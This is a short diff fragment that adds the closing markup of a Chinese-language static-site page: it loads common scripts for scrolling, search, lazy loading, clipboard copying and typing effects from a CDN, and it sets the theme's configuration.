+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"Nmk","id-2":"Nmk"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":1000}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
